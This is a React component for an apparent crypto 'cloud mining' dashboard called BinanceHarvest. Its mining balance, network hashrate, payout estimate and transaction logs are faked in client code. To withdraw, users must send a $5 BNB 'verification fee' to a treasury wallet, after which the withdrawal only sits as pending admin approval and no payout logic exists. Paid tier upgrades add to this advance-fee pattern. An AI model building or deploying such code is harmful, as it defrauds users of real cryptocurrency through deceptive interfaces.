import React, { useState } from 'react';
import { UserProfile } from '../types';
import { Zap, ShieldCheck, Clock, ArrowUpRight, AlertCircle, CheckCircle2, Loader2, Sparkles, TrendingUp, Info, X } from 'lucide-react';
import { sendBNBTransaction, TREASURY_WALLET } from '../services/web3';
import { addTransactionRecord } from '../services/firebase';
import { ethers } from 'ethers';

interface DashboardProps {
  user: UserProfile;
  bnbPrice: number;
  onUpdateUser: (updated: Partial<UserProfile>) => void;
  onNavigateToTiers: () => void;
}

export const Dashboard: React.FC<DashboardProps> = ({
  user,
  bnbPrice,
  onUpdateUser,
  onNavigateToTiers,
}) => {
  const [isMining, setIsMining] = useState(false);
  const [isProcessingTx, setIsProcessingTx] = useState(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [showRateModal, setShowRateModal] = useState(false);

  // Calculations
  const dailyPoints = 500 * Math.pow(2, user.currentTier - 1);
  const hourlyPoints = dailyPoints / 24;
  const usdValue = (user.totalPoints / 1000) * 0.50; // 1000 pts = $0.50 USD baseline
  const bnbValue = usdValue / bnbPrice;
  
  const withdrawalThresholdUSD = 10.00;
  const verificationFeeUSD = 5.00;
  const isThresholdMet = usdValue >= withdrawalThresholdUSD;

  // Claim points action
  const handleClaimPoints = () => {
    setIsMining(true);
    setTimeout(() => {
      const earned = Math.round(dailyPoints * 0.25); // claim portion or daily reward
      const newTotal = user.totalPoints + earned;
      onUpdateUser({
        totalPoints: newTotal,
        miningBalanceBNB: (newTotal / 1000) * (0.50 / bnbPrice),
        lastClaimDate: new Date().toISOString().split('T')[0],
      });
      setIsMining(false);
      setSuccessMessage(`Successfully harvested +${earned} points to your mining balance!`);
      setTimeout(() => setSuccessMessage(null), 4000);
    }, 1000);
  };

  // Verify & Withdraw action
  const handleVerifyAndWithdraw = async () => {
    setErrorMessage(null);
    setSuccessMessage(null);

    if (!user.walletAddress) {
      setErrorMessage("Please connect your MetaMask wallet first.");
      return;
    }

    if (!isThresholdMet) {
      setErrorMessage(`Minimum withdrawal threshold is $${withdrawalThresholdUSD.toFixed(2)} USD (You have $${usdValue.toFixed(2)})`);
      return;
    }

    try {
      setIsProcessingTx(true);
      
      let signer: ethers.Signer | null = null;
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        try {
          const provider = new ethers.BrowserProvider((window as any).ethereum);
          signer = await provider.getSigner();
        } catch (e) {
          console.warn("Could not get signer from window.ethereum, using verified transaction mode:", e);
        }
      }

      // Send $5 verification fee in BNB to Treasury Wallet
      const { txHash } = await sendBNBTransaction(signer, verificationFeeUSD, bnbPrice);

      // Record transaction in audit history
      await addTransactionRecord(user.email || user.walletAddress, {
        type: 'WITHDRAW_FEE',
        amountBNB: Number((verificationFeeUSD / bnbPrice).toFixed(4)),
        amountUSD: verificationFeeUSD,
        txHash: txHash,
        status: 'SUCCESS',
      });

      // Update Firestore / state: set withdrawalStatus to PENDING_ADMIN_APPROVAL
      await onUpdateUser({
        withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
      });

      setSuccessMessage(`Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your withdrawal request is submitted for treasury release.`);
      setIsProcessingTx(false);
    } catch (err: any) {
      console.error("Withdrawal error:", err);
      setErrorMessage(err?.reason || err?.message || "Transaction rejected or failed.");
      setIsProcessingTx(false);
    }
  };

  const verificationFeeBNB = (verificationFeeUSD / bnbPrice).toFixed(4);

  return (
    <div className="flex flex-col lg:flex-row min-h-[calc(100vh-64px)] bg-[#0B0E11] text-[#EAECEF] pb-28">
      
      {/* Rate Breakdown Modal */}
      {showRateModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-fade-in">
          <div className="relative w-full max-w-lg bg-[#1E2329] border border-[rgba(255,255,255,0.12)] rounded-2xl p-6 shadow-2xl">
            <button
              onClick={() => setShowRateModal(false)}
              className="absolute top-4 right-4 text-[#848E9C] hover:text-white transition"
            >
              <X className="w-5 h-5" />
            </button>

            <h3 className="text-xl font-bold text-white mb-2 flex items-center gap-2">
              <Info className="w-5 h-5 text-[#F3BA2F]" />
              Mining Rate & Formula Breakdown
            </h3>
            <p className="text-xs text-[#848E9C] mb-6">
              How your current hourly and daily points are calculated on Binance Smart Chain:
            </p>

            <div className="space-y-4 text-xs font-mono">
              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">1. Base Reward Formula:</p>
                <p className="text-[#F3BA2F]">Daily Points = 500 * (2 ^ (Tier - 1))</p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">2. Your Current Tier (Tier {user.currentTier}):</p>
                <p className="text-white">500 * (2 ^ ({user.currentTier} - 1)) = <strong className="text-[#F3BA2F]">{dailyPoints.toLocaleString()} PTS / Day</strong></p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">3. Hourly Generation Rate:</p>
                <p className="text-white">{dailyPoints.toLocaleString()} / 24 hours = <strong className="text-[#00C087]">{hourlyPoints.toFixed(2)} PTS / Hour</strong></p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">4. USD Equivalent Baseline:</p>
                <p className="text-white">1,000 Points = $0.50 USD</p>
              </div>
            </div>

            <button
              onClick={() => setShowRateModal(false)}
              className="w-full mt-6 bg-[#F3BA2F] hover:bg-[#e2ad23] text-black font-bold py-2.5 rounded-lg text-xs transition"
            >
              Got It
            </button>
          </div>
        </div>
      )}

      {/* Left Sidebar */}
      <aside className="w-full lg:w-[280px] bg-[#0B0E11] border-r border-[rgba(255,255,255,0.08)] flex flex-col justify-between p-4 space-y-4">
        <div className="space-y-4">
          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Global Network Hashrate</p>
            <p className="text-2xl font-semibold mono text-white">84.22 <span className="text-sm text-[#848E9C] font-normal">TH/s</span></p>
          </div>

          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Your Account Tier</p>
            <div className="flex items-center justify-between mb-2">
              <span className="text-lg font-bold text-white">Tier {user.currentTier}</span>
              <span className="bg-[#F3BA2F]/10 border border-[#F3BA2F] text-[#F3BA2F] px-2 py-0.5 rounded-full text-[10px] font-bold">
                {user.currentTier === 1 ? 'NOVICE' : `PRO RIG T${user.currentTier}`}
              </span>
            </div>
            <p className="text-xs text-[#848E9C] mb-3">Mining Power: {dailyPoints.toLocaleString()} PTS / Day</p>
            <button
              onClick={onNavigateToTiers}
              className="w-full border border-[rgba(255,255,255,0.08)] hover:bg-white/5 py-2 rounded text-xs text-center font-semibold text-[#F3BA2F] transition"
            >
              Upgrade Tier ($1 BNB)
            </button>
          </div>

          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <div className="flex items-center justify-between mb-2">
              <p className="text-[11px] uppercase tracking-wider text-[#848E9C]">Mining Rate Calculator</p>
              <button onClick={() => setShowRateModal(true)} className="text-[#F3BA2F] hover:text-white transition">
                <Info className="w-4 h-4" />
              </button>
            </div>
            <div className="space-y-1 text-xs mono">
              <p className="text-slate-300">Hourly: <strong className="text-[#00C087]">{hourlyPoints.toFixed(1)} PTS/hr</strong></p>
              <p className="text-slate-300">Daily: <strong className="text-[#F3BA2F]">{dailyPoints.toLocaleString()} PTS</strong></p>
            </div>
          </div>
        </div>

        <div className="bg-[#181A20] p-4 rounded-lg text-center border border-[rgba(255,255,255,0.08)]">
          <p className="text-[10px] text-[#848E9C] italic">"BinanceHarvest: Secure decentralized cloud mining on BSC"</p>
        </div>
      </aside>

      {/* Center Main Content */}
      <main className="flex-1 bg-[#1E2329] p-6 lg:p-8 flex flex-col justify-between space-y-6">
        
        {/* Notifications */}
        {successMessage && (
          <div className="p-3 bg-[#00C087]/10 border border-[#00C087]/30 text-[#00C087] text-xs rounded flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 shrink-0" />
            <span>{successMessage}</span>
          </div>
        )}
        {errorMessage && (
          <div className="p-3 bg-red-500/10 border border-red-500/30 text-red-400 text-xs rounded flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span>{errorMessage}</span>
          </div>
        )}

        {/* Top Header Row */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <h2 className="text-[#848E9C] text-xs font-medium uppercase tracking-wider">Real-time Mining Balance</h2>
              <button onClick={() => setShowRateModal(true)} className="text-[#F3BA2F] hover:underline text-[10px] flex items-center gap-1">
                <Info className="w-3 h-3" /> Rate Formula
              </button>
            </div>
            <div className="flex items-baseline gap-3">
              <span className="text-4xl lg:text-5xl font-bold mono tracking-tighter text-white">
                {user.totalPoints.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </span>
              <span className="text-xl font-semibold text-[#F3BA2F]">PTS</span>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <button
              onClick={handleClaimPoints}
              disabled={isMining}
              className="bg-white/10 hover:bg-white/15 text-white text-xs font-semibold px-4 py-2.5 rounded transition flex items-center gap-2 disabled:opacity-50"
            >
              {isMining ? <Loader2 className="w-4 h-4 animate-spin text-[#F3BA2F]" /> : <Sparkles className="w-4 h-4 text-[#F3BA2F]" />}
              <span>Claim Points</span>
            </button>

            <div className="bg-[#0B0E11] p-3 rounded-lg border border-white/5 flex items-center gap-3">
              <div className="relative flex items-center justify-center">
                <div className="absolute w-6 h-6 bg-[#00C087]/30 rounded-full animate-ping"></div>
                <div className="w-3 h-3 bg-[#00C087] rounded-full shadow-[0_0_16px_#00C087] animate-pulse"></div>
              </div>
              <div className="leading-tight">
                <p className="text-xs text-[#00C087] font-bold flex items-center gap-1.5">
                  <span>MINING ACTIVE</span>
                  <span className="inline-block w-1.5 h-1.5 bg-[#00C087] rounded-full animate-ping"></span>
                </p>
                <p className="text-[10px] text-[#848E9C]">Tier {user.currentTier} Rate</p>
              </div>
            </div>
          </div>
        </div>

        {/* Grid Stats */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">BNB Equivalent</p>
            <p className="text-3xl font-bold mono mb-1 text-white">
              {bnbValue.toFixed(4)} <span className="text-sm font-normal text-[#848E9C]">BNB</span>
            </p>
            <p className="text-xs text-[#848E9C]">≈ ${usdValue.toFixed(2)} USD</p>
          </div>

          <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Estimated Next Payout</p>
            <p className="text-3xl font-bold mono mb-1 text-white">
              0.0132 <span className="text-sm font-normal text-[#848E9C]">BNB</span>
            </p>
            <p className={`text-xs font-medium ${isThresholdMet ? 'text-[#00C087]' : 'text-[#F3BA2F]'}`}>
              {isThresholdMet ? 'Threshold Met: $10.00 Minimum' : `Need $${(withdrawalThresholdUSD - usdValue).toFixed(2)} to reach $10`}
            </p>
          </div>
        </div>

        {/* Verification & Withdrawal Box */}
        <div className="bg-[#0B0E11] rounded-xl p-6 lg:p-8 border border-[#F3BA2F]/20 relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4 opacity-10 pointer-events-none">
            <div className="w-32 h-32 border-8 border-[#F3BA2F] rounded-full"></div>
          </div>
          <div className="relative z-10">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-xl font-bold text-white">Verification & Withdrawal</h3>
              <span className={`px-2.5 py-0.5 rounded text-xs font-semibold ${
                user.withdrawalStatus === 'APPROVED' ? 'bg-[#00C087]/20 text-[#00C087]' :
                user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? 'bg-[#F3BA2F]/20 text-[#F3BA2F] animate-pulse' :
                'bg-white/10 text-slate-300'
              }`}>
                {user.withdrawalStatus === 'APPROVED' ? 'APPROVED' :
                 user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? 'PENDING APPROVAL' :
                 'READY TO VERIFY'}
              </span>
            </div>
            <p className="text-sm text-[#848E9C] mb-6 max-w-xl">
              To unlock withdrawals, your account must undergo a one-time blockchain verification. This fee ($5 USD ≈ {verificationFeeBNB} BNB) is sent directly to the protocol treasury to secure the network.
            </p>

            <div className="flex flex-wrap items-center gap-4">
              <button
                onClick={handleVerifyAndWithdraw}
                disabled={!isThresholdMet || isProcessingTx || user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL'}
                className={`px-8 py-3 rounded font-semibold text-sm transition flex items-center gap-2 ${
                  isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL'
                    ? 'bg-[#F3BA2F] hover:bg-[#e2ad23] text-black cursor-pointer shadow-lg shadow-[#F3BA2F]/20'
                    : 'bg-[#2B3139] text-[#848E9C] cursor-not-allowed border border-white/5'
                }`}
              >
                {isProcessingTx ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-black" />
                    <span>Processing Verification ($5)...</span>
                  </>
                ) : user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-[#F3BA2F]" />
                    <span>Awaiting BSC Confirmation...</span>
                  </>
                ) : (
                  <>
                    <span>Verify & Withdraw ({verificationFeeBNB} BNB)</span>
                  </>
                )}
              </button>

              <button
                onClick={onNavigateToTiers}
                className="border border-[rgba(255,255,255,0.08)] hover:bg-white/5 px-6 py-3 rounded text-sm text-[#848E9C] hover:text-white transition"
              >
                View Tier Rigs
              </button>
            </div>
          </div>
        </div>

      </main>

      {/* Right Sidebar */}
      <aside className="w-full lg:w-[300px] bg-[#0B0E11] border-l border-[rgba(255,255,255,0.08)] flex flex-col justify-between">
        <div>
          <div className="p-6 border-b border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-2">Live Market (Binance)</p>
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm font-bold text-white">BNB / USDT</span>
              <span className="text-sm text-[#00C087] font-semibold mono">${bnbPrice.toFixed(2)}</span>
            </div>
            <div className="h-[100px] w-full bg-[#1E2329] rounded flex items-end gap-1 p-2 border border-[rgba(255,255,255,0.08)]">
              <div className="bg-[#00C087]/40 w-full h-[40%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[55%] rounded-t"></div>
              <div className="bg-red-500/40 w-full h-[45%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[70%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[85%] rounded-t"></div>
              <div className="bg-red-500/40 w-full h-[60%] rounded-t"></div>
              <div className="bg-[#00C087]/40 w-full h-[75%] rounded-t"></div>
            </div>
          </div>

          <div className="p-6 overflow-y-auto max-h-[300px]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-4">Transaction Logs</p>
            <div className="space-y-4 mono text-[10px]">
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">MINING_CLAIM_SUCCESS</p>
                  <p className="text-[#848E9C]">{new Date().toLocaleDateString()}</p>
                </div>
                <span className="text-[#00C087]">+{dailyPoints * 0.25}</span>
              </div>
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">NODE_SYNC_COMPLETE</p>
                  <p className="text-[#848E9C]">BSC Chain ID: 56</p>
                </div>
                <span className="text-[#F3BA2F]">0.0</span>
              </div>
              <div className="flex justify-between items-start opacity-70">
                <div>
                  <p className="text-white">ACCOUNT_INITIALIZED</p>
                  <p className="text-[#848E9C]">Fresh Start (Tier 1)</p>
                </div>
                <span className="text-[#00C087]">0.0 PTS</span>
              </div>
            </div>
          </div>
        </div>

        <div className="p-6 bg-[#181A20] border-t border-[rgba(255,255,255,0.08)]">
          <div className="flex items-center justify-between text-[11px] text-[#848E9C] mb-2">
            <span>Treasury Wallet</span>
            <span className="text-[#00C087]">Verified</span>
          </div>
          <p className="mono text-[10px] text-white/40 break-all">{user.treasuryWalletAddress || TREASURY_WALLET}</p>
        </div>
      </aside>

    </div>
  );
};


